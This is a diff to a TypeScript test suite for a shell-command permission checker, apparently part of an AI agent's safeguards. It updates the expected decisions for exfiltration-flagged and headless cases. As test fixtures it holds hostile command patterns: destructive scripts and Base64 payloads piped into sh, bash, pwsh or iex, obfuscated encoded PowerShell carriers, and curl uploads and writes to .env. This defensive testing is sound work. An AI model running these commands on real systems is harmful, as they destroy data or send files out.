@@ -68,7 +68,8 @@ interface EncodedCase {
   readonly expectedOutcome: ExpectedOutcome;
   readonly exactEligible: boolean;
   readonly allowBody: string;
-  readonly permissionFloor?: "protected-path" | "exfiltration";
+  readonly permissionFloor?: "protected-path";
+  readonly exfiltration?: true;
   readonly admissionLimit?: true;
   readonly allowCommands?: readonly string[];
   readonly decodedScript?: string;
@@ -152,14 +153,11 @@ const UNRESOLVED_OPERAND_CASES = ([
   { name: "an earlier matching name in ordinary data from a structured shell", dialect: "powershell", command: "printf %s pwsh -enc 'not-base64!'", allowBody: "printf *" },
 ] as const).map((fixture) => ({ ...EXPECTED_UNPROVEN, ...fixture }));
 
-const WINDOWS_LITERAL_ROOT_FLOOR = process.platform === "win32"
-  ? { permissionFloor: "protected-path" as const } : {};
-
 const PIPELINE_CASES: readonly EncodedCase[] = [
-  { ...EXPECTED_UNPROVEN, ...WINDOWS_LITERAL_ROOT_FLOOR, name: "literal text piped to a shell", dialect: "bash", command: `printf %s '${DESTRUCTIVE_SCRIPT}' | sh`, allowBody: "sh *" },
-  { ...EXPECTED_UNPROVEN, ...WINDOWS_LITERAL_ROOT_FLOOR, name: "literal text piped to an alternate shell", dialect: "bash", command: `printf %s '${DESTRUCTIVE_SCRIPT}' | bash`, allowBody: "bash *" },
-  { ...EXPECTED_UNPROVEN, ...WINDOWS_LITERAL_ROOT_FLOOR, name: "literal text piped to an explicit stdin shell", dialect: "powershell", command: `Write-Output '${DESTRUCTIVE_SCRIPT}' | pwsh -`, allowBody: "pwsh *" },
-  { ...EXPECTED_UNPROVEN, ...WINDOWS_LITERAL_ROOT_FLOOR, name: "literal text piped to an expression evaluator", dialect: "powershell", command: `Write-Output '${DESTRUCTIVE_SCRIPT}' | iex`, allowBody: "iex *" },
+  { ...EXPECTED_UNPROVEN, name: "literal text piped to a shell", dialect: "bash", command: `printf %s '${DESTRUCTIVE_SCRIPT}' | sh`, allowBody: "sh *" },
+  { ...EXPECTED_UNPROVEN, name: "literal text piped to an alternate shell", dialect: "bash", command: `printf %s '${DESTRUCTIVE_SCRIPT}' | bash`, allowBody: "bash *" },
+  { ...EXPECTED_UNPROVEN, name: "literal text piped to an explicit stdin shell", dialect: "powershell", command: `Write-Output '${DESTRUCTIVE_SCRIPT}' | pwsh -`, allowBody: "pwsh *" },
+  { ...EXPECTED_UNPROVEN, name: "literal text piped to an expression evaluator", dialect: "powershell", command: `Write-Output '${DESTRUCTIVE_SCRIPT}' | iex`, allowBody: "iex *" },
   { ...EXPECTED_UNPROVEN, name: "UTF-8 Base64 decoded into a shell pipeline", allowCommands: [`printf %s ${DESTRUCTIVE_UTF8_PAYLOAD}`, "base64 -d", "sh"], dialect: "bash", command: `printf %s ${DESTRUCTIVE_UTF8_PAYLOAD} | base64 -d | sh`, allowBody: "sh *" },
   { ...EXPECTED_UNPROVEN, name: "UTF-8 Base64 decoded into a shell through a wrapper", allowCommands: [`printf %s ${DESTRUCTIVE_UTF8_PAYLOAD}`, "base64 -d", "env sh"], dialect: "bash", command: `printf %s ${DESTRUCTIVE_UTF8_PAYLOAD} | base64 -d | env sh`, allowBody: "env *" },
   { ...EXPECTED_UNPROVEN, name: "text piped to an interpreter's explicit stdin", allowCommands: ["printf %s 'print(1)'", "python3 -"], dialect: "bash", command: "printf %s 'print(1)' | python3 -", allowBody: "python3 *" },
@@ -256,7 +254,7 @@ function requireLaneBehavior(fixture: EncodedCase): void {
       const foreground = checkShellPermission(manager, cwd, SESSION_ID, command, dialect, sandboxed);
       expect.soft(foreground, `sandboxed=${sandboxed}, saved=${saved}`).toMatchObject(expected);
       if (!fixture.permissionFloor) expect.soft(foreground).not.toHaveProperty("forceModal");
-      expect.soft(checkShellPermission(manager, cwd, SESSION_ID, command, dialect, sandboxed, true), `headless, sandboxed=${sandboxed}, saved=${saved}`).toMatchObject(fixture.admissionLimit ? expected : fixture.permissionFloor ? { decision: "deny", reasonCode: "no-approver" } : expected);
+      expect.soft(checkShellPermission(manager, cwd, SESSION_ID, command, dialect, sandboxed, true), `headless, sandboxed=${sandboxed}, saved=${saved}`).toMatchObject(fixture.admissionLimit ? expected : fixture.permissionFloor || fixture.exfiltration && !saved ? { decision: "deny", reasonCode: "no-approver" } : expected);
     }
   }
 }
@@ -323,14 +321,14 @@ const CONFIGURATION_CASES: readonly EncodedCase[] = ([
   { ...EXPECTED_UNPROVEN, name: "grouped startup config suppression", command: "curl -sq https://example.invalid/" },
   { ...EXPECTED_STATIC, name: "first short startup config suppression", command: "curl -q https://example.invalid/" },
   { ...EXPECTED_STATIC, name: "first long startup config suppression", command: "curl --disable https://example.invalid/" },
-  { expectedOutcome: "visible-floor", exactEligible: false, name: "explicit config after startup suppression", permissionFloor: "exfiltration", command: "curl -q -K settings https://example.invalid/" },
-  { expectedOutcome: "visible-floor", exactEligible: false, name: "visible upload after startup suppression", permissionFloor: "exfiltration", command: "curl -q -T notes.txt https://example.invalid/" },
-  { expectedOutcome: "visible-floor", exactEligible: false, name: "sensitive output after startup suppression", permissionFloor: "exfiltration", command: "curl -q -o .env https://example.invalid/" },
+  { expectedOutcome: "visible-floor", exactEligible: false, name: "explicit config after startup suppression", exfiltration: true, command: "curl -q -K settings https://example.invalid/" },
+  { expectedOutcome: "visible-floor", exactEligible: false, name: "visible upload after startup suppression", exfiltration: true, command: "curl -q -T notes.txt https://example.invalid/" },
+  { expectedOutcome: "visible-floor", exactEligible: false, name: "sensitive output after startup suppression", exfiltration: true, command: "curl -q -o .env https://example.invalid/" },
 ] as const).flatMap((fixture) => ([
   { dialect: "bash" as const, prefix: "" },
   { dialect: "bash" as const, prefix: "env " },
   { dialect: "powershell" as const, prefix: "env " },
-]).map(({ dialect, prefix }) => ({ ...fixture, dialect, command: prefix + fixture.command, allowBody: prefix + fixture.command })));
+]).map(({ dialect, prefix }) => ({ ...fixture, dialect, exactEligible: fixture.command.includes(" -T ") || dialect === "bash" && fixture.command.includes(" -K ") ? true : fixture.exactEligible, command: prefix + fixture.command, allowBody: prefix + fixture.command })));
 
 describe("configuration loading proof", () => {
   it.each(["wget https://example.invalid/", "curl https://example.invalid/", "WGET https://example.invalid/", "CURL https://example.invalid/", "curl -q https://example.invalid/", "curl --disable https://example.invalid/"])("refuses edition-dependent native and cmdlet bindings: %s", (command) => {
@@ -344,17 +342,18 @@ describe("configuration loading proof", () => {
   it.each(CONFIGURATION_CASES)("$dialect: $command", (fixture) => {
     requireLaneBehavior(fixture);
     if (fixture.exactEligible) return;
+    const storedRuleMatches = fixture.command.includes(" -T ") && process.platform !== "win32";
     const kind = fixture.dialect === "bash" ? "Bash" : "PowerShell";
     manager.setRules([withCurrentShellRuleVersion<PermissionRule>({ pattern: `${kind}(${fixture.command})`, action: "allow" })]);
     for (const sandboxed of [false, true]) {
       expect(checkShellPermission(manager, cwd, SESSION_ID, fixture.command, fixture.dialect, sandboxed))
         .toMatchObject(fixture.permissionFloor
           ? { decision: "ask", forceModal: true, reasonCode: fixture.permissionFloor }
-          : { decision: "allow", reasonCode: "allow-mode" });
+          : { decision: "allow", reasonCode: storedRuleMatches ? "rule-allow" : "allow-mode" });
       expect(checkShellPermission(manager, cwd, SESSION_ID, fixture.command, fixture.dialect, sandboxed, true))
-        .toMatchObject(fixture.permissionFloor
+        .toMatchObject(fixture.permissionFloor || fixture.exfiltration && !storedRuleMatches
           ? { decision: "deny", reasonCode: "no-approver" }
-          : { decision: "allow", reasonCode: "allow-mode" });
+          : { decision: "allow", reasonCode: storedRuleMatches ? "rule-allow" : "allow-mode" });
     }
   });
 });
@@ -486,7 +485,7 @@ const OPAQUE_CARRIER_CASES: readonly EncodedCase[] = [
   { ...EXPECTED_UNPROVEN, name: "caret escape inside a command string", dialect: "powershell", command: 'cmd /c "pwsh -en^c %PAYLOAD%"', allowBody: "cmd *" },
   { ...EXPECTED_UNPROVEN, name: "caret escape inside a command string from bash", dialect: "bash", command: 'cmd /c "pwsh -en^c %PAYLOAD%"', allowBody: "cmd *" },
   { ...EXPECTED_UNPROVEN, name: "nine padding chunks before a stdin carrier", allowCommands: [`printf %s ${"AAAA ".repeat(9)}${DESTRUCTIVE_PAYLOAD}`, "pwsh -Command -"], dialect: "bash", command: `printf %s ${"AAAA ".repeat(9)}${DESTRUCTIVE_PAYLOAD} | pwsh -Command -`, allowBody: "pwsh *" },
-  { ...EXPECTED_UNPROVEN, name: "two hundred fifty-six padding chunks in an encoded operand", dialect: "powershell", command: `pwsh -enc '${"AAAA ".repeat(256)}${DESTRUCTIVE_PAYLOAD}'`, allowBody: "pwsh *", admissionLimit: true },
+  { ...EXPECTED_UNPROVEN, name: "two hundred fifty-six padding chunks in an encoded operand", dialect: "powershell", command: `pwsh -enc '${"AAAA ".repeat(256)}${DESTRUCTIVE_PAYLOAD}'`, allowBody: "pwsh *" },
   { ...EXPECTED_UNPROVEN, name: "one hundred kilobyte input", admissionLimit: true, dialect: "bash", command: `echo ${"a".repeat(100_000)}`, allowBody: "echo *" },
   { ...EXPECTED_UNPROVEN, name: "stdin to a script-file interpreter", allowCommands: ["printf input", "python3 scripts/consume.py"], dialect: "bash", command: "printf input | python3 scripts/consume.py", allowBody: "python3 *" },
   ...(["bash", "powershell"] as const).flatMap((dialect) => [
